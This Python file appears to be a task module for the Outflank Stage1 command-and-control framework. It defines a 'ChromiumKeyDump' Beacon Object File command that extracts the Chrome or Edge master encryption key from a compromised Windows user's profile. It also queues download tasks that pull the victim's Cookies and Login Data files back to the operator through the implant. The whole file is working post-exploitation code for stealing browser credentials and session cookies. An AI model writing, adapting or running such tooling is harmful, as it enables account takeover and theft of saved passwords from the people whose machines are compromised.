from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.tasks import DownloadTask


class ChromiumKeyDumpBOF(BaseBOFTask):
    def __init__(self):
        super().__init__("ChromiumKeyDump")

        _browser_choices = ["chrome", "edge"]

        self.parser.description = (
            "BOF implementation of Chlonium tool to dump Chrome/Edge Masterkey and download Cookie/Login Data files"
        )
        self.parser.epilog = "Usage: ChromiumKeyDump <chrome|edge>"

        self.parser.add_argument(
            "browser",
            choices=_browser_choices,
            help=f"Browsers ({', '.join(_browser_choices)}).",     
            metavar="browser", 
        )

    def _get_path(self, arguments: List[str]):
        parser_arguments = self.parser.parse_args(arguments)

        username = self.get_implant().get_username()
        _, username = username.split('\\')
        path = f"C:\\Users\\{username}\\AppData\\Local\\"

        browser = parser_arguments.browser
        if browser == "chrome":
            path += "Google\\Chrome"
        else:
            path += "Microsoft\\Edge"

        return path

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        path = self._get_path(arguments)
        path += "\\User Data\\Local State"

        return [(BOFArgumentEncoding.STR, path)]

    def run(self, arguments: List[str]):
        self.append_response(f"Tasked to dump Masterykey and download Cookies/LoginData\n")

        path = self._get_path(arguments)
        cookiesPath = path + "\\User Data\\Default\\Network\\Cookies"
        dataPath = path + "\\User Data\\Default\\Login Data"

        self.add_task_after(DownloadTask(path=cookiesPath))
        self.add_task_after(DownloadTask(path=dataPath))

        super().run(arguments)
